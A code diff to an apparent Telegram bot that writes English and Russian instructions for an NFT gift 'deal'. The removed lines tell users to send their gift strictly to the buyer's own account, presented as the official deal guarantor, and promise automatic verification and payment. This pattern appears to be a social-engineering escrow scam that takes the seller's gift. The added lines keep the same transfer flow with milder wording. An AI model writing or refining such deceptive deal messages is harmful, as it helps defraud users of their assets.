@@ -114,27 +114,27 @@ async def handle_deal_bot_message(message: Message, bot: Bot):
         screen2_text = (
             f"<b>Gift:</b> <a href=\"{deal['nft_url']}\"><b>{deal['nft_name']} #{formatted_number}</b></a>\n"
             f"<b>Deal amount:</b> <b>{deal['stars_amount']} {currency_name}</b>\n"
-            f"<b>Guarantor:</b> {buyer_display}\n"
+            f"<b>Recipient:</b> {buyer_display}\n"
             f"<b>Status:</b> <b>Awaiting gift transfer</b>\n\n"
-            f"<blockquote><b>ATTENTION: Transfer the gift STRICTLY to official GUARANTOR ({buyer_display})! Do not send it to anyone else.</b></blockquote>\n\n"
-            f"<b>Transfer instructions:</b>\n"
-            f"1. Tap <b>«Send gift... ↗»</b> to open chat with guarantor {buyer_display}.\n"
-            f"2. In the profile, select gift <b>{deal['nft_name']} #{formatted_number}</b> and confirm transfer in Telegram for 25 stars.\n"
+            f"<blockquote><b>Please transfer the gift to recipient ({buyer_display}) to complete the deal.</b></blockquote>\n\n"
+            f"<b>Instructions:</b>\n"
+            f"1. Tap <b>«Send gift... ↗»</b> to open chat with {buyer_display}.\n"
+            f"2. In profile, select gift <b>{deal['nft_name']} #{formatted_number}</b> and confirm transfer.\n"
             f"3. Return to this chat and tap <b>«Gift sent»</b>.\n\n"
-            f"<b>The system will automatically verify receipt and credit {currency_name} to your balance.</b>"
+            f"<i>Funds will be credited once the transfer is confirmed.</i>"
         )
     else:
         screen2_text = (
             f"<b>Подарок:</b> <a href=\"{deal['nft_url']}\"><b>{deal['nft_name']} #{formatted_number}</b></a>\n"
             f"<b>Сумма сделки:</b> <b>{deal['stars_amount']} {currency_name}</b>\n"
-            f"<b>Гарант сделки:</b> {buyer_display}\n"
+            f"<b>Получатель:</b> {buyer_display}\n"
             f"<b>Статус:</b> <b>Ожидание передачи подарка</b>\n\n"
-            f"<blockquote><b>ВНИМАНИЕ: Передавать подарок нужно СТРОГО ГАРАНТУ ({buyer_display})! Ни в коем случае не отправляйте подарок другим лицам.</b></blockquote>\n\n"
+            f"<blockquote><b>Для завершения сделки передайте подарок получателю ({buyer_display}).</b></blockquote>\n\n"
             f"<b>Порядок передачи:</b>\n"
-            f"1. Нажмите кнопку <b>«Отправить подарок... ↗»</b>, чтобы открыть диалог с гарантом {buyer_display}.\n"
-            f"2. В открывшемся профиле выберите подарок <b>{deal['nft_name']} #{formatted_number}</b> и подтвердите системную передачу Telegram за 25 звёзд.\n"
+            f"1. Нажмите <b>«Отправить подарок... ↗»</b>, чтобы открыть диалог с {buyer_display}.\n"
+            f"2. В профиле выберите подарок <b>{deal['nft_name']} #{formatted_number}</b> и подтвердите передачу.\n"
             f"3. Вернитесь в этот диалог и нажмите <b>«Подарок отправлен»</b>.\n\n"
-            f"<b>Система автоматически верифицирует поступление NFT и зачислит звёзды на баланс.</b>"
+            f"<i>После подтверждения передачи подарка баланс будет пополнен.</i>"
         )
 
     screen2_kb = get_screen2_keyboard(target_url=target_url, deal_id=deal_id, lang=deal_lang)
